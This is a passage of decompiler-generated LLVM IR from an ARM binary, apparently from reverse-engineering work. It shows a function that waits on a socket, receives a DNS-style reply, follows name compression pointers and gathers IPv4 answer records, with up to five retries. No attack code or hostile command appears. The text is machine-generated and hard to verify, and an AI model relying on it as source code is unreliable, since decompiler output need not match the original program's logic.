  store i32 5, i32* %ip.global-to-local, align 4
  store i32 %v8_110e4, i32* %v2_110d8, align 4
  %v0_110f4 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_110f4, i32* %stack_var_-48, align 4
  store i32 %v2_110fc, i32* %lr.global-to-local, align 4
  store i32 %v2_10f54, i32* %ip.global-to-local, align 4
  %v0_11104 = load i32, i32* %r7.global-to-local, align 4
  %v1_11104 = load i32, i32* %r3.global-to-local, align 4
  %v2_11104 = add i32 %v1_11104, %v0_11104
  store i32 %v2_11104, i32* %r0.global-to-local, align 4
  store i32 %v2_1102c, i32* %r1.global-to-local, align 4
  %v0_11110 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11110, i32* %r2.global-to-local, align 4
  store i32 %v0_11110, i32* %r3.global-to-local, align 4
  %v5_1111c = call i32 @_select(i32 %v2_11104, i32 %v2_1102c, i32 %v0_11110, i32 %v0_11110, i32 %v2_110fc)
  store i32 %v5_1111c, i32* %r0.global-to-local, align 4
  %v7_11120 = icmp eq i32 %v5_1111c, -1
  store i1 %v7_11120, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11120, label %dec_label_pc_1119c, label %dec_label_pc_11128

dec_label_pc_11128:                               ; preds = %dec_label_pc_110c4
  %v2_11128 = icmp eq i32 %v5_1111c, 0
  store i1 %v2_11128, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11128, label %dec_label_pc_1117c, label %dec_label_pc_11130

dec_label_pc_11130:                               ; preds = %dec_label_pc_11128
  %v0_11130 = load i32, i32* %r5.global-to-local, align 4
  %v1_11130 = add i32 %v0_11130, -156
  %v2_11130 = inttoptr i32 %v1_11130 to i32*
  %v3_11130 = load i32, i32* %v2_11130, align 4
  %v1_11134 = load i32, i32* %r8.global-to-local, align 4
  %v6_11134 = ashr i32 %v3_11130, %v1_11134
  store i32 %v6_11134, i32* %r3.global-to-local, align 4
  %v1_11138 = urem i32 %v6_11134, 2
  %v2_11138 = icmp eq i32 %v1_11138, 0
  store i1 %v2_11138, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11138, label %dec_label_pc_1119c, label %dec_label_pc_11140

dec_label_pc_11140:                               ; preds = %dec_label_pc_11130
  store i32 %v2_10ff4, i32* @r1, align 4
  store i32 2048, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_1114c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1114c, i32* @r0, align 4
  %v0_11150 = load i32, i32* %r4.global-to-local, align 4
  %v6_11158 = call i32 @_recvfrom(i32 %v0_1114c, i32 %v2_10ff4, i32 2048, i32 16384, i32 %v0_11150, i32 %v0_11150)
  store i32 %v6_11158, i32* %r4.global-to-local, align 4
  %v0_11160 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_11160, i32* %r0.global-to-local, align 4
  %v1_11164 = inttoptr i32 %v0_11160 to i8*
  %v2_11164 = call i32 @function_13a54(i8* %v1_11164)
  %v1_11168 = add i32 %v2_11164, 17
  store i32 %v1_11168, i32* %r0.global-to-local, align 4
  %v0_1116c = load i32, i32* %r4.global-to-local, align 4
  %v3_1116c = icmp ult i32 %v0_1116c, %v1_11168
  %v9_1116c = icmp eq i32 %v0_1116c, %v1_11168
  store i1 %v9_1116c, i1* %cpsr_z.global-to-local, align 1
  store i32 -4252, i32* %r4.global-to-local, align 4
  br i1 %v3_1116c, label %dec_label_pc_1117c, label %dec_label_pc_111d0

dec_label_pc_1117c:                               ; preds = %dec_label_pc_11140, %dec_label_pc_111d0, %dec_label_pc_1120c, %dec_label_pc_11128, %dec_label_pc_111c4
  %v0_1117c = load i32, i32* %sl.global-to-local, align 4
  %v7_1117c = icmp eq i32 %v0_1117c, 5
  store i1 %v7_1117c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1117c, label %dec_label_pc_1119c, label %dec_label_pc_11184

dec_label_pc_11184:                               ; preds = %dec_label_pc_1118c, %dec_label_pc_1117c
  %v0_11184 = phi i32 [ %v0_11194, %dec_label_pc_1118c ], [ %v0_1117c, %dec_label_pc_1117c ]
  %v1_11184 = add i32 %v0_11184, 1
  store i32 %v1_11184, i32* %sl.global-to-local, align 4
  %v0_11030.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11030

dec_label_pc_1118c:                               ; preds = %dec_label_pc_11070, %dec_label_pc_11058
  %v0_1118c = phi i32 [ %v4_11080, %dec_label_pc_11070 ], [ %v3_11064, %dec_label_pc_11058 ]
  %v1_1118c = add i32 %v0_1118c, 2
  store i32 %v1_1118c, i32* %r0.global-to-local, align 4
  %v1_11190 = call i32 @_sleep(i32 %v1_1118c)
  store i32 %v1_11190, i32* %r0.global-to-local, align 4
  %v0_11194 = load i32, i32* %sl.global-to-local, align 4
  %v7_11194 = icmp eq i32 %v0_11194, 5
  store i1 %v7_11194, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11194, label %dec_label_pc_1119c, label %dec_label_pc_11184

dec_label_pc_1119c:                               ; preds = %dec_label_pc_1118c, %dec_label_pc_1117c, %dec_label_pc_11130, %dec_label_pc_110c4, %dec_label_pc_1121c, %dec_label_pc_11228.backedge
  %v0_1119c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1119c, i32* %r0.global-to-local, align 4
  %v1_111a0 = call i32 @close(i32 %v0_1119c)
  store i32 %v1_111a0, i32* %r0.global-to-local, align 4
  store i32 %v2_10ed4, i32* %r2.global-to-local, align 4
  %v2_111a8 = load i8, i8* %v3_10ed4, align 1
  %v3_111a8 = zext i8 %v2_111a8 to i32
  store i32 %v3_111a8, i32* %r4.global-to-local, align 4
  %v2_111ac = icmp eq i8 %v2_111a8, 0
  store i1 %v2_111ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_111ac, label %dec_label_pc_11308, label %dec_label_pc_111b4

dec_label_pc_111b4:                               ; preds = %dec_label_pc_1119c, %dec_label_pc_11308
  %stack_var_-4300.0 = phi i8* [ %v5_1131c, %dec_label_pc_11308 ], [ %v3_10ed4, %dec_label_pc_1119c ]
  %v4_111b4 = ptrtoint i8* %stack_var_-4300.0 to i32
  store i32 %v4_111b4, i32* %r0.global-to-local, align 4
  %v2_111c0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_111c0, i32* @r4, align 4
  ret i32 %v4_111b4

dec_label_pc_111c4:                               ; preds = %bb126
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_111c8 = call i32 @_sleep(i32 1)
  store i32 %v1_111c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1117c

dec_label_pc_111d0:                               ; preds = %dec_label_pc_11140
  store i32 %v2_10ff4, i32* %lr.global-to-local, align 4
  store i32 %v1_111d4, i32* %fp.global-to-local, align 4
  store i32 %v1_111d4, i32* %r0.global-to-local, align 4
  %v2_111dc = call i32 @function_13a54(i8* %v1_111dc)
  store i32 %v2_111dc, i32* %r0.global-to-local, align 4
  store i32 %v2_10ff4, i32* %ip.global-to-local, align 4
  store i32 %v2_110d0, i32* %r1.global-to-local, align 4
  %v4_111ec = load i8, i8* %stack_var_-4288, align 1
  %v5_111ec = sext i8 %v4_111ec to i32
  store i32 %v5_111ec, i32* %r3.global-to-local, align 4
  %v3_111f0 = load i8, i8* %v2_111f0, align 1
  %v4_111f0 = zext i8 %v3_111f0 to i32
  store i32 %v4_111f0, i32* %r2.global-to-local, align 4
  store i32 %v4_10fa8, i32* %lr.global-to-local, align 4
  %v4_111f8 = mul nuw nsw i32 %v4_111f0, 256
  %v5_111f8 = or i32 %v4_111f8, %v5_111ec
  store i32 %v5_111f8, i32* %r3.global-to-local, align 4
  %v0_111fc = load i32, i32* %fp.global-to-local, align 4
  %v9_11200 = icmp eq i32 %v5_111f8, %v4_10fa8
  store i1 %v9_11200, i1* %cpsr_z.global-to-local, align 1
  %v2_111fc = add i32 %v2_111dc, 5
  %v1_11204 = add i32 %v2_111fc, %v0_111fc
  store i32 %v1_11204, i32* %r0.global-to-local, align 4
  br i1 %v9_11200, label %dec_label_pc_1120c, label %dec_label_pc_1117c

dec_label_pc_1120c:                               ; preds = %dec_label_pc_111d0
  %v3_1120c = load i8, i8* %v2_1120c, align 1
  %v4_1120c = zext i8 %v3_1120c to i32
  store i32 %v4_1120c, i32* %r2.global-to-local, align 4
  %v3_11210 = load i8, i8* %v2_11210, align 1
  %v4_11210 = zext i8 %v3_11210 to i32
  store i32 %v4_11210, i32* %r3.global-to-local, align 4
  %v4_11214 = mul nuw nsw i32 %v4_11210, 256
  %v5_11214 = or i32 %v4_11214, %v4_1120c
  store i32 %v5_11214, i32* %r2.global-to-local, align 4
  %v7_11214 = icmp eq i32 %v5_11214, 0
  store i1 %v7_11214, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11214, label %dec_label_pc_1117c, label %dec_label_pc_1121c

dec_label_pc_1121c:                               ; preds = %dec_label_pc_1120c
  %v3_11220 = mul nuw nsw i32 %v4_1120c, 256
  %v5_11224 = or i32 %v4_11210, %v3_11220
  %v1_112dc = add i32 %v2_10ff4, -49152
  %v1_11228143 = add nsw i32 %v5_11224, -1
  %v3_1122c144 = mul i32 %v1_11228143, 65536
  store i32 %v3_1122c144, i32* %r3.global-to-local, align 4
  %v7_11230150 = icmp eq i32 %v3_1122c144, -65536
  store i1 %v7_11230150, i1* %cpsr_z.global-to-local, align 1
  %v3_11234151 = urem i32 %v1_11228143, 65536
  store i32 %v3_11234151, i32* %r6.global-to-local, align 4
  br i1 %v7_11230150, label %dec_label_pc_1119c, label %dec_label_pc_1123c.lr.ph

dec_label_pc_1123c.lr.ph:                         ; preds = %dec_label_pc_1121c
  %v1_113b8 = add i32 %v2_10ed4, 4
  %v2_113b8 = inttoptr i32 %v1_113b8 to i32*
  br label %dec_label_pc_1123c

dec_label_pc_1123c:                               ; preds = %dec_label_pc_1123c.lr.ph, %dec_label_pc_11228.backedge
  %v3_11234153 = phi i32 [ %v3_11234151, %dec_label_pc_1123c.lr.ph ], [ %v3_11234, %dec_label_pc_11228.backedge ]
  %v0_11290152 = phi i32 [ %v1_11204, %dec_label_pc_1123c.lr.ph ], [ %storemerge, %dec_label_pc_11228.backedge ]
  store i32 %v0_11290152, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  store i32 1, i32* %ip.global-to-local, align 4
  %v1_1124817 = inttoptr i32 %v0_11290152 to i8*
  %v2_1124818 = load i8, i8* %v1_1124817, align 1
  %v3_1124819 = zext i8 %v2_1124818 to i32
  store i32 %v3_1124819, i32* %r2.global-to-local, align 4
  %v2_1124c20 = icmp eq i8 %v2_1124818, 0
  store i1 %v2_1124c20, i1* %cpsr_z.global-to-local, align 1
  %v3_1125021 = mul nuw nsw i32 %v3_1124819, 256
  store i32 %v3_1125021, i32* %r1.global-to-local, align 4
  br i1 %v2_1124c20, label %dec_label_pc_11288, label %dec_label_pc_11258.preheader

dec_label_pc_11258.preheader:                     ; preds = %dec_label_pc_1123c, %dec_label_pc_11248.backedge
  %v1_1132c = phi i32 [ %v1_1132c49, %dec_label_pc_11248.backedge ], [ 1, %dec_label_pc_1123c ]
  %v0_1132447 = phi i32 [ %v0_11324, %dec_label_pc_11248.backedge ], [ 0, %dec_label_pc_1123c ]
  %v0_1126445 = phi i32 [ %v3_11250, %dec_label_pc_11248.backedge ], [ %v3_1125021, %dec_label_pc_1123c ]
  %v0_1126043 = phi i32 [ %v1_11328, %dec_label_pc_11248.backedge ], [ %v0_11290152, %dec_label_pc_1123c ]
  %v0_1125841 = phi i32 [ %v3_11248, %dec_label_pc_11248.backedge ], [ %v3_1124819, %dec_label_pc_1123c ]
  br label %dec_label_pc_11258

dec_label_pc_11258:                               ; preds = %dec_label_pc_11258.preheader, %dec_label_pc_11260
  %v0_11324 = phi i32 [ %v0_1132447, %dec_label_pc_11258.preheader ], [ 1, %dec_label_pc_11260 ]
  %v0_11264 = phi i32 [ %v0_1126445, %dec_label_pc_11258.preheader ], [ %v3_11280, %dec_label_pc_11260 ]
  %v0_11328 = phi i32 [ %v0_1126043, %dec_label_pc_11258.preheader ], [ %v2_11270, %dec_label_pc_11260 ]
  %v0_11258 = phi i32 [ %v0_1125841, %dec_label_pc_11258.preheader ], [ %v3_11274, %dec_label_pc_11260 ]
  %v7_11258 = icmp eq i32 %v0_11258, 191
  store i1 %v7_11258, i1* %cpsr_z.global-to-local, align 1
  %tmp180 = icmp ult i32 %v0_11258, 192
  br i1 %tmp180, label %dec_label_pc_11324, label %dec_label_pc_11260

dec_label_pc_11260:                               ; preds = %dec_label_pc_11258
  %v1_11260 = add i32 %v0_11328, 1
  %v2_11260 = inttoptr i32 %v1_11260 to i8*
  %v3_11260 = load i8, i8* %v2_11260, align 1
  %v4_11260 = zext i8 %v3_11260 to i32
  store i32 %v2_10ff4, i32* %r1.global-to-local, align 4
  %v2_11264 = add i32 %v0_11264, %v1_112dc
  %v2_11270 = add i32 %v2_11264, %v4_11260
  store i32 %v2_11270, i32* %r3.global-to-local, align 4
  %v1_11274 = inttoptr i32 %v2_11270 to i8*
  %v2_11274 = load i8, i8* %v1_11274, align 1
  %v3_11274 = zext i8 %v2_11274 to i32
  store i32 %v3_11274, i32* %r2.global-to-local, align 4
  %v2_11278 = icmp eq i8 %v2_11274, 0
  store i1 %v2_11278, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %lr.global-to-local, align 4
  %v3_11280 = mul nuw nsw i32 %v3_11274, 256
  store i32 %v3_11280, i32* %r1.global-to-local, align 4
  br i1 %v2_11278, label %dec_label_pc_11288, label %dec_label_pc_11258

dec_label_pc_11288:                               ; preds = %dec_label_pc_11248.backedge, %dec_label_pc_11260, %dec_label_pc_1123c
  %v1_1128c = phi i32 [ 1, %dec_label_pc_1123c ], [ %v1_1132c, %dec_label_pc_11260 ], [ %v1_1132c49, %dec_label_pc_11248.backedge ]
  %v0_11288 = phi i32 [ 0, %dec_label_pc_1123c ], [ 1, %dec_label_pc_11260 ], [ %v0_11324, %dec_label_pc_11248.backedge ]
  %v7_11288 = icmp eq i32 %v0_11288, 1
  store i1 %v7_11288, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11288, label %bb127, label %bb128

bb127:                                            ; preds = %dec_label_pc_11288
  %v2_1128c = add i32 %v1_1128c, 1
  store i32 %v2_1128c, i32* %ip.global-to-local, align 4
  br label %bb128

bb128:                                            ; preds = %dec_label_pc_11288, %bb127
  %v1_11290 = phi i32 [ %v1_1128c, %dec_label_pc_11288 ], [ %v2_1128c, %bb127 ]
  %v2_11290 = add i32 %v1_11290, %v0_11290152
  store i32 %v2_11290, i32* %r4.global-to-local, align 4
  %v3_11294 = inttoptr i32 %v2_11290 to i8*
  %v4_11294 = load i8, i8* %v3_11294, align 1
  %v6_11294 = zext i8 %v4_11294 to i32
  store i32 %v6_11294, i32* %r3.global-to-local, align 4
  %v1_11298 = add i32 %v2_11290, 1
  %v2_11298 = inttoptr i32 %v1_11298 to i8*
  %v3_11298 = load i8, i8* %v2_11298, align 1
  %v4_11298 = zext i8 %v3_11298 to i32
  store i32 %v4_11298, i32* %r2.global-to-local, align 4
  %v4_1129c = mul nuw nsw i32 %v4_11298, 256
  %v5_1129c = or i32 %v4_1129c, %v6_11294
  store i32 %v5_1129c, i32* %r3.global-to-local, align 4
  %v7_112a0 = icmp eq i32 %v5_1129c, 256
  store i1 %v7_112a0, i1* %cpsr_z.global-to-local, align 1
  %v1_112a4 = add i32 %v2_11290, 10
  store i32 %v1_112a4, i32* %r5.global-to-local, align 4
  br i1 %v7_112a0, label %dec_label_pc_11344, label %dec_label_pc_112ac

dec_label_pc_112ac:                               ; preds = %dec_label_pc_11344, %bb128
  store i32 %v1_112a4, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_112b823 = inttoptr i32 %v1_112a4 to i8*
  %v2_112b824 = load i8, i8* %v1_112b823, align 1
  %v3_112b825 = zext i8 %v2_112b824 to i32
  store i32 %v3_112b825, i32* %r2.global-to-local, align 4
  %v2_112bc26 = icmp eq i8 %v2_112b824, 0
  store i1 %v2_112bc26, i1* %cpsr_z.global-to-local, align 1
  %v3_112c027 = mul nuw nsw i32 %v3_112b825, 256
  store i32 %v3_112c027, i32* %r1.global-to-local, align 4
  br i1 %v2_112bc26, label %dec_label_pc_112f8, label %dec_label_pc_112c8.preheader

dec_label_pc_112c8.preheader:                     ; preds = %dec_label_pc_112ac, %dec_label_pc_112b8.backedge
  %v1_1133c = phi i32 [ %v1_1133c64, %dec_label_pc_112b8.backedge ], [ 1, %dec_label_pc_112ac ]
  %v0_1133462 = phi i32 [ %v0_11334, %dec_label_pc_112b8.backedge ], [ 0, %dec_label_pc_112ac ]
  %v0_112d460 = phi i32 [ %v3_112c0, %dec_label_pc_112b8.backedge ], [ %v3_112c027, %dec_label_pc_112ac ]
  %v0_112d058 = phi i32 [ %v1_11338, %dec_label_pc_112b8.backedge ], [ %v1_112a4, %dec_label_pc_112ac ]
  %v0_112c856 = phi i32 [ %v3_112b8, %dec_label_pc_112b8.backedge ], [ %v3_112b825, %dec_label_pc_112ac ]
  br label %dec_label_pc_112c8

dec_label_pc_112c8:                               ; preds = %dec_label_pc_112c8.preheader, %dec_label_pc_112d0
  %v0_11334 = phi i32 [ %v0_1133462, %dec_label_pc_112c8.preheader ], [ 1, %dec_label_pc_112d0 ]
  %v0_112d4 = phi i32 [ %v0_112d460, %dec_label_pc_112c8.preheader ], [ %v3_112f0, %dec_label_pc_112d0 ]
  %v0_11338 = phi i32 [ %v0_112d058, %dec_label_pc_112c8.preheader ], [ %v2_112e0, %dec_label_pc_112d0 ]
  %v0_112c8 = phi i32 [ %v0_112c856, %dec_label_pc_112c8.preheader ], [ %v3_112e4, %dec_label_pc_112d0 ]
  %v7_112c8 = icmp eq i32 %v0_112c8, 191
  store i1 %v7_112c8, i1* %cpsr_z.global-to-local, align 1
  %tmp181 = icmp ult i32 %v0_112c8, 192
  br i1 %tmp181, label %dec_label_pc_11334, label %dec_label_pc_112d0

dec_label_pc_112d0:                               ; preds = %dec_label_pc_112c8
  %v1_112d0 = add i32 %v0_11338, 1
  %v2_112d0 = inttoptr i32 %v1_112d0 to i8*
  %v3_112d0 = load i8, i8* %v2_112d0, align 1
  %v4_112d0 = zext i8 %v3_112d0 to i32
  store i32 %v2_10ff4, i32* %r1.global-to-local, align 4
  %v2_112d4 = add i32 %v0_112d4, %v1_112dc
  %v2_112e0 = add i32 %v2_112d4, %v4_112d0
  store i32 %v2_112e0, i32* %r3.global-to-local, align 4
  %v1_112e4 = inttoptr i32 %v2_112e0 to i8*
  %v2_112e4 = load i8, i8* %v1_112e4, align 1
  %v3_112e4 = zext i8 %v2_112e4 to i32
  store i32 %v3_112e4, i32* %r2.global-to-local, align 4
  %v2_112e8 = icmp eq i8 %v2_112e4, 0
  store i1 %v2_112e8, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %ip.global-to-local, align 4
  %v3_112f0 = mul nuw nsw i32 %v3_112e4, 256
  store i32 %v3_112f0, i32* %r1.global-to-local, align 4
  br i1 %v2_112e8, label %dec_label_pc_112f8, label %dec_label_pc_112c8

dec_label_pc_112f8:                               ; preds = %dec_label_pc_112b8.backedge, %dec_label_pc_112d0, %dec_label_pc_112ac
  %v1_112fc = phi i32 [ 1, %dec_label_pc_112ac ], [ %v1_1133c, %dec_label_pc_112d0 ], [ %v1_1133c64, %dec_label_pc_112b8.backedge ]
  %v0_112f8 = phi i32 [ 0, %dec_label_pc_112ac ], [ 1, %dec_label_pc_112d0 ], [ %v0_11334, %dec_label_pc_112b8.backedge ]
  %v7_112f8 = icmp eq i32 %v0_112f8, 1
  store i1 %v7_112f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112f8, label %bb129, label %bb130

bb129:                                            ; preds = %dec_label_pc_112f8
  %v2_112fc = add i32 %v1_112fc, 1
  store i32 %v2_112fc, i32* %r0.global-to-local, align 4
  br label %bb130

bb130:                                            ; preds = %dec_label_pc_112f8, %bb129
  %v1_11300 = phi i32 [ %v1_112fc, %dec_label_pc_112f8 ], [ %v2_112fc, %bb129 ]
  %v2_11300 = add i32 %v1_11300, %v1_112a4
  br label %dec_label_pc_11228.backedge

dec_label_pc_11228.backedge:                      ; preds = %bb130, %dec_label_pc_113ec
  %v0_11228.pre = phi i32 [ %v3_11234153, %bb130 ], [ %v0_11228.pre.pre, %dec_label_pc_113ec ]
  %storemerge = phi i32 [ %v2_11300, %bb130 ], [ %v2_11400, %dec_label_pc_113ec ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_11228 = add i32 %v0_11228.pre, -1
  %v3_1122c = mul i32 %v1_11228, 65536
  store i32 %v3_1122c, i32* %r3.global-to-local, align 4
  %v7_11230 = icmp eq i32 %v3_1122c, -65536
  store i1 %v7_11230, i1* %cpsr_z.global-to-local, align 1
  %v3_11234 = urem i32 %v1_11228, 65536
  store i32 %v3_11234, i32* %r6.global-to-local, align 4
  br i1 %v7_11230, label %dec_label_pc_1119c, label %dec_label_pc_1123c

dec_label_pc_11308:                               ; preds = %dec_label_pc_1119c
  %v1_11308 = add i32 %v2_10ed4, 4
  %v2_11308 = inttoptr i32 %v1_11308 to i32*
  %v3_11308 = load i32, i32* %v2_11308, align 4
  store i32 %v3_11308, i32* %r0.global-to-local, align 4
  %v2_1130c = icmp eq i32 %v3_11308, 0
  store i1 %v2_1130c, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_11314.236 to i32), i32* %lr.global-to-local, align 4
  %v1_11310 = xor i1 %v2_1130c, true
  call void @__pseudo_cond_branch(i1 %v1_11310, i32 ptrtoint (i32* @global_var_8de4.114 to i32))
  store i32 %v2_10ed4, i32* %r0.global-to-local, align 4
  %v1_11318 = inttoptr i32 %v2_10ed4 to i32*
  call void @free(i32* %v1_11318)
  store i32 ptrtoint (i32* @0 to i32), i32* %r0.global-to-local, align 4
  %v0_1131c = load i32, i32* %r4.global-to-local, align 4
  %v5_1131c = inttoptr i32 %v0_1131c to i8*
  br label %dec_label_pc_111b4

dec_label_pc_11324:                               ; preds = %dec_label_pc_11258
  %v2_11324 = icmp eq i32 %v0_11324, 0
  store i1 %v2_11324, i1* %cpsr_z.global-to-local, align 1
  %v1_11328 = add i32 %v0_11328, 1
  store i32 %v1_11328, i32* %r3.global-to-local, align 4
  br i1 %v2_11324, label %bb131, label %dec_label_pc_11248.backedge

dec_label_pc_11248.backedge:                      ; preds = %dec_label_pc_11324, %bb131
  %v1_1132c49 = phi i32 [ %v1_1132c, %dec_label_pc_11324 ], [ %v2_1132c, %bb131 ]
  %v1_11248 = inttoptr i32 %v1_11328 to i8*
  %v2_11248 = load i8, i8* %v1_11248, align 1
  %v3_11248 = zext i8 %v2_11248 to i32
  store i32 %v3_11248, i32* %r2.global-to-local, align 4
  %v2_1124c = icmp eq i8 %v2_11248, 0
  store i1 %v2_1124c, i1* %cpsr_z.global-to-local, align 1
  %v3_11250 = mul nuw nsw i32 %v3_11248, 256
  store i32 %v3_11250, i32* %r1.global-to-local, align 4
  br i1 %v2_1124c, label %dec_label_pc_11288, label %dec_label_pc_11258.preheader

bb131:                                            ; preds = %dec_label_pc_11324
  %v2_1132c = add i32 %v1_1132c, 1
  store i32 %v2_1132c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11248.backedge

dec_label_pc_11334:                               ; preds = %dec_label_pc_112c8
  %v2_11334 = icmp eq i32 %v0_11334, 0
  store i1 %v2_11334, i1* %cpsr_z.global-to-local, align 1
  %v1_11338 = add i32 %v0_11338, 1
  store i32 %v1_11338, i32* %r3.global-to-local, align 4
  br i1 %v2_11334, label %bb132, label %dec_label_pc_112b8.backedge

dec_label_pc_112b8.backedge:                      ; preds = %dec_label_pc_11334, %bb132
  %v1_1133c64 = phi i32 [ %v1_1133c, %dec_label_pc_11334 ], [ %v2_1133c, %bb132 ]
  %v1_112b8 = inttoptr i32 %v1_11338 to i8*
  %v2_112b8 = load i8, i8* %v1_112b8, align 1
  %v3_112b8 = zext i8 %v2_112b8 to i32
  store i32 %v3_112b8, i32* %r2.global-to-local, align 4
  %v2_112bc = icmp eq i8 %v2_112b8, 0
  store i1 %v2_112bc, i1* %cpsr_z.global-to-local, align 1
  %v3_112c0 = mul nuw nsw i32 %v3_112b8, 256
  store i32 %v3_112c0, i32* %r1.global-to-local, align 4
  br i1 %v2_112bc, label %dec_label_pc_112f8, label %dec_label_pc_112c8.preheader

bb132:                                            ; preds = %dec_label_pc_11334
  %v2_1133c = add i32 %v1_1133c, 1
  store i32 %v2_1133c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_112b8.backedge

dec_label_pc_11344:                               ; preds = %bb128
  %v1_11344 = add i32 %v2_11290, 2
  %v2_11344 = inttoptr i32 %v1_11344 to i8*
  %v3_11344 = load i8, i8* %v2_11344, align 1
  %v4_11344 = zext i8 %v3_11344 to i32
  store i32 %v4_11344, i32* %r3.global-to-local, align 4
  %v1_11348 = add i32 %v2_11290, 3
  %v2_11348 = inttoptr i32 %v1_11348 to i8*
  %v3_11348 = load i8, i8* %v2_11348, align 1
  %v4_11348 = zext i8 %v3_11348 to i32
  store i32 %v4_11348, i32* %r2.global-to-local, align 4
  %v4_1134c = mul nuw nsw i32 %v4_11348, 256
  %v5_1134c = or i32 %v4_1134c, %v4_11344
  store i32 %v5_1134c, i32* %r3.global-to-local, align 4
  %v7_11350 = icmp eq i32 %v5_1134c, 256
  store i1 %v7_11350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11350, label %dec_label_pc_11358, label %dec_label_pc_112ac

dec_label_pc_11358:                               ; preds = %dec_label_pc_11344
  %v1_11358 = add i32 %v2_11290, 8
  %v2_11358 = inttoptr i32 %v1_11358 to i8*
  %v3_11358 = load i8, i8* %v2_11358, align 1
  %v4_11358 = zext i8 %v3_11358 to i32
  store i32 %v4_11358, i32* %r1.global-to-local, align 4
  %v1_1135c = add i32 %v2_11290, 9
  %v2_1135c = inttoptr i32 %v1_1135c to i8*
  %v3_1135c = load i8, i8* %v2_1135c, align 1
  %v4_1135c = zext i8 %v3_1135c to i32
  store i32 %v4_1135c, i32* %r0.global-to-local, align 4
  %v4_11360 = mul nuw nsw i32 %v4_1135c, 256
  %v5_11360 = or i32 %v4_11360, %v4_11358
  %v3_11364 = mul i32 %v5_11360, 65536
  store i32 %v3_11364, i32* %r2.global-to-local, align 4
  %v3_11368 = mul nuw nsw i32 %v4_11358, 256
  %v5_11370 = or i32 %v4_1135c, %v3_11368
  store i32 %v5_11370, i32* %r3.global-to-local, align 4
  %v7_11374 = icmp eq i32 %v5_11370, 4
  store i1 %v7_11374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11374, label %dec_label_pc_1137c, label %dec_label_pc_113ec

dec_label_pc_1137c:                               ; preds = %dec_label_pc_11358
  %v2_1137c = inttoptr i32 %v1_112a4 to i8*
  %v3_1137c = load i8, i8* %v2_1137c, align 1
  %v4_1137c = zext i8 %v3_1137c to i32
  store i32 %v4_1137c, i32* %r3.global-to-local, align 4
  store i32 %v2_10f54, i32* %r2.global-to-local, align 4
  %v1_11388 = add i32 %v2_11290, 11
  %v2_11388 = inttoptr i32 %v1_11388 to i8*
  %v3_11388 = load i8, i8* %v2_11388, align 1
  %v4_11388 = zext i8 %v3_11388 to i32
  store i32 %v4_11388, i32* %r2.global-to-local, align 4
  store i32 %v2_10f54, i32* %r3.global-to-local, align 4
  %v1_11394 = add i32 %v2_11290, 12
  %v2_11394 = inttoptr i32 %v1_11394 to i8*
  %v3_11394 = load i8, i8* %v2_11394, align 1
  %v4_11394 = zext i8 %v3_11394 to i32
  store i32 %v4_11394, i32* %r3.global-to-local, align 4
  store i32 %v2_10f54, i32* %ip.global-to-local, align 4
  %v1_113a0 = add i32 %v2_11290, 13
  %v2_113a0 = inttoptr i32 %v1_113a0 to i8*
  %v3_113a0 = load i8, i8* %v2_113a0, align 1
  %v4_113a0 = zext i8 %v3_113a0 to i32
  store i32 %v4_113a0, i32* %r2.global-to-local, align 4
  store i32 %v2_10ed4, i32* %lr.global-to-local, align 4
  %v2_113ac = load i8, i8* %v3_10ed4, align 1
  %v3_113ac = zext i8 %v2_113ac to i32
  %v3_113b0 = mul nuw nsw i32 %v3_113ac, 4
  %v1_113b4 = add nuw nsw i32 %v3_113b0, 4
  store i32 %v1_113b4, i32* %r1.global-to-local, align 4
  %v3_113b8 = load i32, i32* %v2_113b8, align 4
  store i32 %v3_113b8, i32* %r0.global-to-local, align 4
  %v8_113bc = inttoptr i32 %v3_113b8 to i32*
  %v9_113bc = call i32* @realloc(i32* %v8_113bc, i32 %v1_113b4)
  %v10_113bc = ptrtoint i32* %v9_113bc to i32
  store i32 %v10_113bc, i32* %r0.global-to-local, align 4
  store i32 %v2_10ed4, i32* %r1.global-to-local, align 4
  store i32 %v2_10f54, i32* %ip.global-to-local, align 4
  %v2_113c8 = load i8, i8* %v3_10ed4, align 1
  %v3_113c8 = zext i8 %v2_113c8 to i32
  store i32 %v3_113c8, i32* %r2.global-to-local, align 4
  %v4_113cc = sext i8 %v3_1137c to i32
  store i32 %v4_113cc, i32* %r3.global-to-local, align 4
  store i32 %v2_10ed4, i32* %lr.global-to-local, align 4
  %v1_113d4 = add nuw nsw i32 %v3_113c8, 1
  store i32 %v1_113d4, i32* %r1.global-to-local, align 4
  %v5_113d8 = mul nuw nsw i32 %v3_113c8, 4
  %v6_113d8 = add i32 %v5_113d8, %v10_113bc
  %v7_113d8 = inttoptr i32 %v6_113d8 to i32*
  store i32 %v4_113cc, i32* %v7_113d8, align 4
